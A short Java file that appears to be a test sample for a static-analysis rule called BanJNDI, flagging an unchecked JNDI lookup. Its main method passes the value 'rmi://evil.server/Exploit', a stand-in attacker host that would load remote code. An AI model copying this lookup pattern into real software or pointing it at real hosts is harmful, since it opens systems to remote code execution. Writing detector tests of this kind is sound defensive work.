import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    // Method to return false for the unreachable while loop
    private boolean getUnreachableCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI

        // Unreachable while loop
        while (getUnreachableCondition()) {
            // This code will never execute
            System.out.println("Unreachable code");
        }

        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}